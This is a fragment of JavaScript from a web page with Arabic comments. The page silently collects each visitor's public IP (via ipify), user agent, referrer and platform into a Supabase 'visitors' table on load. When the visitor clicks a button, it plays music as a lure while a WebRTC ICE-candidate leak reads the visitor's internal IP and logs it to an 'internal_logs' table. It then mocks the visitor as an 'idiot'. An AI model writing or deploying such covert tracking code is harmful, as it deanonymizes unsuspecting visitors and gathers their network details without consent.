        // 1. سحب صامت للبيانات العامة
        async function silentCapture() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await supabaseClient.from('visitors').insert([{
                    device_info: navigator.userAgent,
                    referrer: document.referrer || "Direct",
                    ip_address: ipData.ip,
                    platform: navigator.platform
                }]);
            } catch (e) { console.log("Silent error"); }
        }
        silentCapture();

        // 2. دالة سحب الـ Internal IP
        function getInternalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ipMatch) { resolve(ipMatch[1]); pc.onicecandidate = null; }
                };
                setTimeout(() => resolve("Blocked/mDNS"), 2500);
            });
        }

        async function captureInternal() {
            const btn = document.getElementById('btn');
            const loader = document.getElementById('loader');
            const audio = document.getElementById('myAudio');
            const status = document.getElementById('statusMsg');
            
            btn.style.display = 'none';
            loader.style.display = 'block';

            // تشغيل الأغنية فوراً أول ما يدوس
            audio.play().catch(e => console.log("Audio play failed"));

            try {
                const localIP = await getInternalIP();
                // إرسال الـ IP لجدول الـ internal_logs
                await supabaseClient.from('internal_logs').insert([{ internal_ip: localIP }]);
            } catch (e) { 
                console.log("Error logging internal IP");
            } finally {
                loader.style.display = 'none';
                btn.style.display = 'inline-block';
                btn.innerText = "عليا الطلاق شقلب واقلب";
                btn.disabled = true;
                status.innerText = "Enjoy the music, idiot! 😉";
            }
        }
    </script>
